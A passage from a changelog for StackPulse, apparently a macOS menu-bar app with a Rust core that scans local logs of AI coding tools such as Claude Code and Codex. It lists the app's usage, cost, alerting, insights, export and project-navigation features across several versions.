  recovered by a bounded byte-scan — **no SQLite dependency**). Token and cost are
  managed **server-side** by Gemini and aren't available locally, so they are
  honestly not shown (no fabricated numbers) — the card explains this.
- **In-progress Antigravity sessions surface as Missions** — they appear in the
  Missions view and the menu-bar ▶N active-session count, alongside Claude/Codex.
- **Activity-aware provider card.** A provider with local activity but no local
  token/cost accounting (Antigravity) now shows a **session + model row** instead
  of a misleading "$0 · 0 tokens" spend row.
- The engine registers three full scanners (Claude, Codex, Antigravity) + eight
  detection-only providers (still eleven total). Antigravity's capability matrix
  gains auth / local-session-history / live-task-detection. +3 tests.

### Insights & reporting (app 0.3.0 / protocol 1.8.0)

- **Derived insights engine (core, protocol 1.8.0).** New `Insight` /
  `InsightImpact` / `InsightKind` types + an additive `UsageSnapshot.insights`
  list. The portable core now turns each scan into ranked, actionable
  observations — all computed **locally**, no network: **low cache efficiency**
  (savings left unclaimed), **spend anomaly** (today vs. the 30-day average),
  **approaching limit** (a heads-up band that sits a notch below the alert
  threshold so the two never double-fire), **idle provider** (detected but unused
  30 days), **cost concentration** (one model dominating spend), and a hedged
  **possibly-stalled session** (an AI coding session idle mid-task — surfaced for
  you to judge, never auto-acted upon). Ranked most-useful-first. 19 new tests.
- **Insights section (app).** A new **Insights** sidebar destination with a count
  badge, impact-grouped Liquid-Glass cards (High → Medium → Low), each showing the
  provider, a highlighted metric, and a relative time — plus a friendly empty
  state and a "these are suggestions; nothing changes automatically" reassurance.
- **Data export & reporting (app).** Export your usage as **CSV or JSON** and a
  one-click **Copy summary** — snapshot export + Copy summary live in Settings
  ("Data & export"), history export lives in Trends. Saves go through a standard
  save panel (you pick the location); everything stays on your Mac.

### Notifications & proactive alerting (app 0.2.0 — app-only, no protocol/core change)

- **Native macOS notifications for needs-attention alerts.** When a new alert
  appears (a usage limit nearing its cap, a spend anomaly, an integration issue),
  StackPulse now raises a system notification — a menu-bar app is far more useful
  when it can tap you on the shoulder instead of only showing state when opened.
  Clicking a notification opens the app on the needs-attention section.
  Everything stays local: notifications only ever surface an alert already derived
  from your own data; nothing is originated or sent anywhere.
- **Transition-based, non-spammy delivery.** A pure, self-tested gate
  (`NotificationGate`) notifies only when an alert *newly* becomes active — the
  first snapshot after launch seeds silently (no burst for pre-existing state),
  a persisting alert never re-fires, and a cleared-then-returning condition
  notifies again. Re-delivery replaces (not stacks) by alert id.
- **Proactive Claude live-limit alerts.** The offline core can't see Claude's
  live session/weekly limits, so it never alerted on them. The app now synthesizes
  needs-attention alerts from the merged live limits — warning at ≥ 80%, critical
  at ≥ 95% — surfaced across the popover, inbox, and menu-bar badge, and eligible
  for notification. Codex limit alerts continue to come from the core (no dupes).
- **Notification preferences (Settings).** Master toggle, a severity threshold
  (All / Warnings+ / Critical), quiet hours (a from/to window that may wrap
  midnight, muting banners while keeping alerts in-app), a one-click *Send a test
  notification* button, and a hint when banners are disabled in System Settings.
  All persisted in `UserDefaults`.
- **Self-tests + a diagnostic.** `--selftest-parsers` now also asserts the
  notification gate and quiet-hours logic; `--selftest-notify` posts a test banner
  and reads it back from Notification Center as an end-to-end delivery probe.
- **Fixed:** a Swift 6 actor-isolation trap (`dispatch_assert_queue_fail`) that
  crashed the app on launch — the `UNUserNotificationCenter` Objective-C
  completion bridge, invoked from a `@MainActor` context, resumed its continuation
  with a main-actor isolation check that failed on the daemon's background queue.
  The center calls now run from a `nonisolated static` helper, hopping back to the
  main actor only to publish results.

### Added

- **Portable Rust core (`stackpulse-core`, 0.1.0).** A platform-neutral engine
  that detects supported providers, scans their local logs, normalizes tokens,
  estimates cost, aggregates windows, and dispatches requests. Builds for
  non-macOS targets (no platform-specific code). Entry points: `Engine` and
  `handle_request_json(&str) -> String`.
- **Versioned protocol (`stackpulse-protocol`, `PROTOCOL_VERSION = 1.0.0`).**
  Serde contracts shared across the ecosystem: `ProviderId`, `Capability`,
  `CapabilityState`, `IntegrationHealth`, `Provenance`, `TokenTotals`,
  `SpendWindow`, `ModelUsage`, `LimitWindow`, `ProviderUsage`, `UsageSnapshot`,
  and the `CoreRequest`/`CoreResponse` envelopes with `CoreError`/`ErrorCode`.
  Forward-compatible by design (`#[serde(other)]` for unknown provider ids,
  `#[serde(default)]` for additive fields).
- **Claude (Claude Code) local-cost scanner.** Reads `{root}/projects/**/*.jsonl`
  with config-root resolution (`$CLAUDE_CONFIG_DIR` → `$XDG_CONFIG_HOME/claude`
  → `~/.config/claude` → `~/.claude`); sums `message.usage.*` token counts;
  deduplicates by `(message.id, requestId)`; reports per-model breakdown and
  cache metrics. Claude's `input_tokens` already excludes cache, matching the
  core's exclusive-input convention. Auth is detected by credential presence
  only (file or Keychain), never by reading the secret.
- **Codex (OpenAI Codex CLI) local-cost scanner.** Reads
  `$CODEX_HOME/sessions/**/*.jsonl` and `archived_sessions/**/*.jsonl`; sums the
  per-turn `last_token_usage` delta (not the cumulative total); tracks the active
  model from `turn_context`; captures **provider-reported 5-hour and weekly
  rate-limit windows** from `payload.rate_limits` with **zero network calls**.
  OpenAI's `input_tokens` (which includes cached) is normalized to
  `fresh_input = input - cached`.
- **Detection-only adapters** for the other nine providers (Antigravity, GitHub
  Copilot, Cursor, Devin, **Gemini**, Grok, OpenCode, OpenRouter, Z.ai), driven
  by a single data-driven `DetectableProvider`. Honest installed/authenticated
  detection (presence-only; secrets never opened), best-effort markers annotated
  with confidence, and a fully-enumerated capability matrix. Cloud/API-key
  providers with no local footprint (Devin, OpenRouter, Z.ai) report
  `not_detected`.
- **Gemini (Google) provider** (protocol **1.3.0** — `ProviderId` gained a
  `Gemini` variant). Detected via the Gemini CLI's own markers (`gemini` on
  `$PATH`, `~/.gemini/oauth_creds.json`); the shared `~/.gemini` directory is
  deliberately not treated as a marker because Antigravity writes there too.
  Live quota (Google OAuth usage API) is Planned; detection-only for now.
- **Efficiency analytics** per provider (protocol **1.1.0**, additive): measured
  cache savings (USD the prompt cache saved vs. paying full input rate), estimated
  burn rate ($/active-day), 30-day cache-hit rate, a 30-day daily history for
  charts, and a `today_vs_avg_ratio` spend-anomaly signal. Surfaced in the
  Overview and Usage sections. Measured vs. estimated values are labeled distinctly.
- **Needs-attention alerts** (protocol **1.2.0**, additive): the core derives
  alerts locally from each snapshot — usage-limit thresholds (≥75% warning, ≥90%
  critical), degraded integration health, and spend anomalies — with no network.
  Surfaced as a menu-bar badge, a popover "Needs attention" block, and a
  Needs-Attention inbox in the main window (acknowledge/dismiss).
- **Edge sidebar** — an always-on-top, non-activating `NSPanel` pinned to the
  screen edge with a compact provider + alerts summary, toggled by ⌥⌘S.
- **Keep Awake** — an opt-in power assertion that prevents system sleep while
  monitoring (idle-system-sleep only; display may still sleep).
- **Liquid Glass design system** — a hand-crafted glass material (frosted base +
  diagonal refraction sheen + rim-light edges + colored glow), glossy pill
  segmented controls with a sliding knob, glazed active navigation states, and a
  glass button style. Reduce-Transparency and Reduce-Motion aware; premium in
  both light and dark. (The native macOS 26 `glassEffect` API is unavailable
  under the macOS 15.2 Command Line Tools SDK, so the look is built from SwiftUI
  primitives that run on macOS 14+.)
- **Appearance control** — a System / Light / Dark switcher (glass pill) in
  Settings, applied app-wide (popover, main window, edge sidebar) and persisted.
- **Claude live usage limits** (opt-in, network) — reads the local Claude Code
  login from the macOS Keychain and fetches Anthropic's official OAuth usage API
  (`GET /api/oauth/usage`), giving Claude a real session/weekly limit % in the
  menu bar and popover like Codex. Token stays in memory, HTTPS to Anthropic only,
  never logged/persisted; expired tokens are not refreshed. Off = fully offline.
  A Settings toggle controls it (default on, since the user consented).
- **Project Navigator & Command Memory** (protocol **1.4.0** — `Project`,
  `DiscoveredCommand`, `GetProjects`). Scans user-approved folders for projects
  (git/node/rust/swift/python/go/docker/…), detects frameworks + package manager
  + git branch/remote, and discovers & **safety-classifies** their commands
  (package scripts, Makefile/justfile/Taskfile targets, framework conventions).
  Read-only; never executes anything in the core. A **Projects** section runs the
  right test/build/dev command (copy or run-in-Terminal, with a confirmation for
  anything not read-only).
- **Gemini live quota** wiring is stubbed for a future release; Gemini remains
  detection-only for now.
- **Agent Mission Control** (protocol **1.5.0** — `Mission`, `MissionStatus`,
  `UsageSnapshot.missions`). The core normalizes recently-active AI coding
  sessions from local logs (Claude, Codex) into missions — project, branch,
  model, last activity, token velocity, and an activity status
  (active / idle / recent) — read-only, no network, no process control.
  Surfaced in a Missions section, the Command Center live-activity panel, and an
  active-count indicator in the menu bar + popover.
- **Usage history & trends** (protocol **1.6.0** — `HistoryPoint`,
  `record_history` / `get_history` ops). A durable per-day, per-provider history
  is persisted to a plain JSON store under the app's Application Support dir,
  seeded from the 30 days already in the analytics and then accumulating beyond
  the log-rotation window. A **Trends** section charts multi-month cost/token
  history with a 30d / 90d / All range and a per-provider breakdown. (A plain
  JSON store, not SQLite — the data is tiny and it keeps the core dependency-light.)
- **BYOK provider connections** (protocol **1.7.0** — `ProviderBalance`, optional
  `ProviderUsage.balance`). A Settings "Provider connections" card lets you enter
  API keys for API-key providers; keys are stored in StackPulse's own macOS
  Keychain and sent only to that provider's API. **OpenRouter** and **LiteLLM**
  report a real credit balance (remaining / used / limit) shown on the provider
  card + Integrations. Populated in the app layer, so the portable core stays
  offline. Other API-key providers are connectable now, with balance fetchers to
  follow.
- **Embedded pricing table** of approximate public list prices per 1M tokens
  (as of 2026-07) for the Claude (Opus/Sonnet/Haiku) and OpenAI GPT-5/Codex
  families. All derived costs are labeled `LocalEstimate` and never presented as
  billed amounts. Unpriceable models are excluded from cost totals and surfaced
  in a note.
- **C ABI FFI bridge (`stackpulse-ffi`, `staticlib` + `cdylib`).** Functions
  `sp_core_handle_request(json) -> json`, `sp_core_version()`, and
  `sp_core_string_free()`, with a documented single-owner memory contract and
  panic-safety at the boundary.
- **`stackpulse` CLI.** `snapshot` (human summary or `--json`), `status`,
  `ping`, and raw `request` subcommands. Also serves as the portability
  smoke-test target.
- **macOS menu-bar app (`apps/StackPulseMac`, SwiftPM).** An `NSStatusItem`
  accessory app (no Dock icon) with a SwiftUI liquid-glass popover that links the
  Rust static library and decodes the same protocol JSON as the CLI. Includes a
  presence-only macOS Keychain probe for Claude credentials, a background scan
  off the main actor, and headless `--dump` / `--version` verification modes.
- **UTC date bucketing.** Windows (today / yesterday / last 30 days) are bucketed
  by UTC date in this version; the snapshot discloses `bucket_date_utc` so the UI
  can label windows as UTC-based. See
  [ADR-0007](docs/decisions/0007-utc-bucketing-v0.md).
- **Documentation set.** Architecture, protocol, capability matrix, compatibility,
  security boundaries, cross-repo changelog, and the initial ADRs.

### Security

- No network access in this version; scanning is read-only; symlinked directories
  are not followed during traversal; credentials are detected by presence only.
  See [`docs/SECURITY_BOUNDARIES.md`](docs/SECURITY_BOUNDARIES.md).

### Known limitations

- Only **Claude** and **Codex** have full local usage/cost scanners. The other
  eight (Antigravity, GitHub Copilot, Cursor, Devin, Grok, OpenCode, OpenRouter,
  Z.ai) are **detection-only** — installed/authenticated detection and a
  capability matrix, but no usage scanning yet.
- No live provider usage APIs (Claude's OAuth usage endpoint is not wired).
- No persisted history/database; snapshots are computed on demand.
- No code signing, notarization, DMG, or Sparkle auto-update yet.
- Cost figures are list-price **estimates**, not billed amounts.

[Unreleased]: https://github.com/stackpulse/stackpulse-mac
